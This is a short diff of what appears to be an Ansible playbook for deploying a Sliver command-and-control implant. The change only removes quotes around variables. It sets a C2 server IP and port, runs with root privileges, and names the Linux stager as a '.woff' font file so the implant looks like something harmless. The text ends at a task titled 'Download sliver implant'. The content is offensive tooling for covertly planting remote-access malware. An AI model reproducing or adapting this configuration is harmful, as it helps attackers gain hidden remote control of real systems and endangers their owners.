@@ -3,9 +3,9 @@
   hosts: localhost
   become: true
   vars:
-    sliver_server_ip: "10.40.66.242" # SliverC2 IP
+    sliver_server_ip: 10.40.66.242 # SliverC2 IP
     sliver_server_port: 5555 # Sliver C2 server port
-    sliver_linux_stager: "FIT_EQUIPMENT.woff"
+    sliver_linux_stager: FIT_EQUIPMENT.woff
 
   tasks:
     - name: Download sliver implant
